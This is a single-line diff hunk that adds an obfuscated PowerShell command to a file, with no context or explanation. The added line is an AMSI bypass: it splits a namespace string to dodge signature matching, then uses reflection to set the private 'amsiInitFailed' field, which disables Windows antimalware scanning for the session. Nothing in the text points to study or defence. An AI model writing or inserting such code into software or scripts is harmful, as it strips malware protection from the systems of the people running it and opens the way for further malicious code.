@@ -1,0 +1,1 @@
+$a='Syst'+'em.Manage'+'ment.Autom'+'ation';$b=[AppDomain]::CurrentDomain.GetAssemblies();$c=$b|Where-Object{$_.FullName -like "*$($a)*"};foreach($asm in $c){$t=$asm.GetType($a+'.AmsiUtils');if($t){$f=$t.GetField('amsiInitFailed','NonPublic,Static');if($f){$f.SetValue($null,$true)}}};
